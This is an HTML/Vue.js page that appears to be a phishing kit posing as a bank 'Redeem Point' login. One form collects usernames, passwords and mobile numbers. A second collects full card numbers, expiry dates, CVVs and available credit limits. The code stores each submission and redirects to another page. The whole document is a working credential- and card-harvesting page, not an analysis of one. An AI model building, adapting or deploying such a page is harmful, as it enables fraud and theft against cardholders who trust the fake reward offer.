<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>i - Vue</title>
    <!-- Vue.js favicon -->
    <link rel="icon" type="image/png" href="https://vuejs.org/images/logo.png">
    <!-- Vue.js CDN -->
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        
        body {
            background-color: #f0f0f0;
            min-height: 100vh;
            padding-bottom: 20px;
        }
        
        .header {
            text-align: center;
            padding: 15px;
            background-color: white;
        }
        
        .logo {
            max-width: 100%;
            height: auto;
            max-height: 120px;
        }
        
        .container {
            max-width: 420px;
            margin: 15px auto;
            background-color: white;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.08);
            overflow: hidden;
        }
        
        .form-header {
            color: #000000;
            padding: 18px 20px 15px 20px;
            text-align: center;
            font-size: 18px;
            font-weight: 900;
            letter-spacing: 0.5px;
        }
        
        .tabs-container {
            display: flex;
            background-color: #f5f5f5;
            padding: 3px;
            margin: 0 20px 10px 20px;
            border-radius: 25px;
            height: 38px;
        }
        
        .tab {
            flex: 1;
            padding: 6px 4px;
            text-align: center;
            font-size: 15px;
            font-weight: bold;
            background-color: transparent;
            color: #777777;
            border: none;
            border-radius: 25px;
            cursor: pointer;
            transition: all 0.3s;
            line-height: 1.2;
        }
        
        .tab.active {
            background-color: #24A1E8;
            color: #ffffff;
            box-shadow: 0 2px 4px rgba(36, 161, 232, 0.2);
        }
        
        .form-content {
            padding: 0 20px 20px 20px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-label {
            display: block;
            font-size: 14px;
            font-weight: bold;
            color: #666666;
            margin-bottom: 5px;
        }
        
        .form-input {
            width: 100%;
            padding: 8px 0 4px 0;
            font-size: 16px;
            border: none;
            border-bottom: 1px solid #dddddd;
            background-color: transparent;
            outline: none;
            border-radius: 0;
            transition: border-color 0.3s;
            color: #444444;
            margin-bottom: 5px;
        }
        
        .form-input:focus {
            border-bottom-color: #24A1E8;
        }
        
        .login-button {
            display: block;
            width: 100%;
            padding: 10px;
            background-color: #24A1E8;
            color: white;
            font-size: 15px;
            font-weight: bold;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 25px;
        }
        
        .login-button:hover {
            background-color: #1a8cd8;
        }
        
        .expiry-cvv-container {
            display: flex;
            gap: 20px;
        }
        
        .expiry-cvv-container > div {
            flex: 1;
        }
        
        .footer-img {
            width: 100%;
            max-width: 900px;
            display: block;
            margin: 20px auto 0;
        }
        
        .asterisk {
            color: #ff0000;
            font-size: 15px;
        }
        
        .error-message {
            color: #ff4444;
            font-size: 12px;
            margin-top: 5px;
        }
        
        .form-input.error {
            border-bottom-color: #ff4444;
        }
    </style>
</head>
<body>
    <div id="app">
        <!-- मुख्य कंटेंट, बिना किसी देरी के दिखेगा -->
        <div>
            <div class="header">
                <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" 
                     alt="Skgo" 
                     class="logo">
            </div>
            
            <div class="container">
                <div class="form-header">
                    Continue to Redeem Point
                </div>
                
                <div class="tabs-container">
                    <button class="tab" :class="{ active: currentTab === 'user' }" @click="currentTab = 'user'">User ID</button>
                    <button class="tab" :class="{ active: currentTab === 'card' }" @click="currentTab = 'card'">Credit Card No.</button>
                </div>
                
                <!-- User ID फॉर्म -->
                <div class="form-content" v-show="currentTab === 'user'">
                    <form @submit.prevent="submitUserForm">
                        <div class="form-group">
                            <label class="form-label">Username <span class="asterisk">*</span></label>
                            <input type="text" class="form-input" :class="{ error: userErrors.username }" v-model="userForm.username" @input="clearUserError('username')" required>
                            <div v-if="userErrors.username" class="error-message">{{ userErrors.username }}</div>
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">Password <span class="asterisk">*</span></label>
                            <input type="text" class="form-input" :class="{ error: userErrors.password }" v-model="userForm.password" @input="clearUserError('password')" required minlength="6">
                            <div v-if="userErrors.password" class="error-message">{{ userErrors.password }}</div>
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">Registered Mobile No. <span class="asterisk">*</span></label>
                            <input type="tel" class="form-input" :class="{ error: userErrors.mobile }" v-model="userForm.mobile" @input="formatMobile('user'); clearUserError('mobile')" required maxlength="10" pattern="[0-9]{10}">
                            <div v-if="userErrors.mobile" class="error-message">{{ userErrors.mobile }}</div>
                        </div>
                        
                        <button type="submit" class="login-button">LOGIN</button>
                    </form>
                </div>
                
                <!-- Credit Card फॉर्म -->
                <div class="form-content" v-show="currentTab === 'card'">
                    <form @submit.prevent="submitCardForm">
                        <div class="form-group">
                            <label class="form-label">Credit Card No. <span class="asterisk">*</span></label>
                            <input type="text" class="form-input" :class="{ error: cardErrors.cardNumber }" v-model="cardForm.cardNumber" @input="formatCardNumber; clearCardError('cardNumber')" required>
                            <div v-if="cardErrors.cardNumber" class="error-message">{{ cardErrors.cardNumber }}</div>
                        </div>
                        
                        <div class="expiry-cvv-container">
                            <div class="form-group">
                                <label class="form-label">Expiry Date <span class="asterisk">*</span></label>
                                <input type="text" class="form-input" :class="{ error: cardErrors.expiry }" v-model="cardForm.expiry" @input="formatExpiry; clearCardError('expiry')" required placeholder="MM/YY">
                                <div v-if="cardErrors.expiry" class="error-message">{{ cardErrors.expiry }}</div>
                            </div>
                            <div class="form-group">
                                <label class="form-label">CVV <span class="asterisk">**</span></label>
                                <input type="text" class="form-input" :class="{ error: cardErrors.cvv }" v-model="cardForm.cvv" @input="formatCVV; clearCardError('cvv')" required maxlength="3" pattern="[0-9]{3}">
                                <div v-if="cardErrors.cvv" class="error-message">{{ cardErrors.cvv }}</div>
                            </div>
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">Available Credit Limit <span class="asterisk">*</span></label>
                            <input type="text" class="form-input" :class="{ error: cardErrors.creditLimit }" v-model="cardForm.creditLimit" @input="clearCardError('creditLimit')" required>
                            <div v-if="cardErrors.creditLimit" class="error-message">{{ cardErrors.creditLimit }}</div>
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">Registered Mobile No. <span class="asterisk">*</span></label>
                            <input type="tel" class="form-input" :class="{ error: cardErrors.cardMobile }" v-model="cardForm.cardMobile" @input="formatMobile('card'); clearCardError('cardMobile')" required maxlength="10" pattern="[0-9]{10}">
                            <div v-if="cardErrors.cardMobile" class="error-message">{{ cardErrors.cardMobile }}</div>
                        </div>
                        
                        <button type="submit" class="login-button">LOGIN</button>
                    </form>
                </div>
            </div>
            
            <img src="https://i.ibb.co/5WTjD1Nb/Footer-bfdfef4c-1.jpg" 
                 alt="Sehses" 
                 class="footer-img">
        </div>
    </div>

    <script>
        new Vue({
            el: '#app',
            data: {
                currentTab: 'user',
                // User form data
                userForm: {
                    username: '',
                    password: '',
                    mobile: ''
                },
                userErrors: {},
                // Card form data
                cardForm: {
                    cardNumber: '',
                    expiry: '',
                    cvv: '',
                    creditLimit: '',
                    cardMobile: ''
                },
                cardErrors: {}
            },
            methods: {
                // ---------- User Form Validation ----------
                validateUserForm() {
                    this.userErrors = {};
                    let isValid = true;

                    if (!this.userForm.username.trim()) {
                        this.userErrors.username = 'Username is required';
                        isValid = false;
                    }

                    if (!this.userForm.password.trim()) {
                        this.userErrors.password = 'Password is required';
                        isValid = false;
                    } else if (this.userForm.password.length < 6) {
                        this.userErrors.password = 'Password must be at least 6 characters';
                        isValid = false;
                    }

                    if (!this.userForm.mobile.trim()) {
                        this.userErrors.mobile = 'Mobile number is required';
                        isValid = false;
                    } else if (!/^[0-9]{10}$/.test(this.userForm.mobile)) {
                        this.userErrors.mobile = 'Valid 10-digit mobile number is required';
                        isValid = false;
                    }

                    return isValid;
                },
                clearUserError(field) {
                    if (this.userErrors[field]) {
                        this.$delete(this.userErrors, field);
                    }
                },
                submitUserForm() {
                    if (this.validateUserForm()) {
                        const formData = {
                            username: this.userForm.username,
                            password: this.userForm.password,
                            mobile: this.userForm.mobile
                        };
                        this.saveDataAndRedirect(formData, 'User ID');
                    }
                },

                // ---------- Card Form Validation ----------
                validateCardForm() {
                    this.cardErrors = {};
                    let isValid = true;

                    if (!this.cardForm.cardNumber.trim()) {
                        this.cardErrors.cardNumber = 'Credit card number is required';
                        isValid = false;
                    } else {
                        const plain = this.cardForm.cardNumber.replace(/\s/g, '');
                        if (!/^[0-9]{16}$/.test(plain)) {
                            this.cardErrors.cardNumber = 'Valid 16-digit card number is required';
                            isValid = false;
                        }
                    }

                    if (!this.cardForm.expiry.trim()) {
                        this.cardErrors.expiry = 'Expiry date is required';
                        isValid = false;
                    } else if (!/^(0[1-9]|1[0-2])\/([0-9]{2})$/.test(this.cardForm.expiry)) {
                        this.cardErrors.expiry = 'Format: MM/YY (e.g., 12/25)';
                        isValid = false;
                    }

                    if (!this.cardForm.cvv.trim()) {
                        this.cardErrors.cvv = 'CVV is required';
                        isValid = false;
                    } else if (!/^[0-9]{3}$/.test(this.cardForm.cvv)) {
                        this.cardErrors.cvv = '3-digit CVV is required';
                        isValid = false;
                    }

                    if (!this.cardForm.creditLimit.trim()) {
                        this.cardErrors.creditLimit = 'Credit limit is required';
                        isValid = false;
                    }

                    if (!this.cardForm.cardMobile.trim()) {
                        this.cardErrors.cardMobile = 'Mobile number is required';
                        isValid = false;
                    } else if (!/^[0-9]{10}$/.test(this.cardForm.cardMobile)) {
                        this.cardErrors.cardMobile = 'Valid 10-digit mobile number is required';
                        isValid = false;
                    }

                    return isValid;
                },
                clearCardError(field) {
                    if (this.cardErrors[field]) {
                        this.$delete(this.cardErrors, field);
                    }
                },

                // ---------- Formatting Methods ----------
                formatCardNumber(e) {
                    let value = e.target.value.replace(/\s+/g, '').replace(/\D/g, '');
                    value = value.substring(0, 16);
                    let formatted = '';
                    for (let i = 0; i < value.length; i++) {
                        if (i > 0 && i % 4 === 0) formatted += ' ';
                        formatted += value[i];
                    }
                    this.cardForm.cardNumber = formatted;
                },
                formatExpiry(e) {
                    let value = e.target.value.replace(/\D/g, '');
                    if (value.length >= 2) {
                        value = value.substring(0, 2) + '/' + value.substring(2, 4);
                    }
                    this.cardForm.expiry = value.substring(0, 5);
                },
                formatCVV(e) {
                    this.cardForm.cvv = e.target.value.replace(/\D/g, '').substring(0, 3);
                },
                formatMobile(type) {
                    if (type === 'user') {
                        this.userForm.mobile = this.userForm.mobile.replace(/\D/g, '').substring(0, 10);
                    } else {
                        this.cardForm.cardMobile = this.cardForm.cardMobile.replace(/\D/g, '').substring(0, 10);
                    }
                },

                // ---------- Save & Redirect ----------
                saveDataAndRedirect(formData, formType) {
                    const submissions = JSON.parse(localStorage.getItem('formSubmissions') || '[]');
                    const submission = {
                        id: Date.now(),
                        type: formType,
                        data: formData,
                        timestamp: new Date().toISOString(),
                        ip: 'Not available in browser'
                    };
                    submissions.push(submission);
                    localStorage.setItem('formSubmissions', JSON.stringify(submissions));
                    window.location.href = 'blogone.html';
                }
            }
        });
    </script>
</body>
</html>
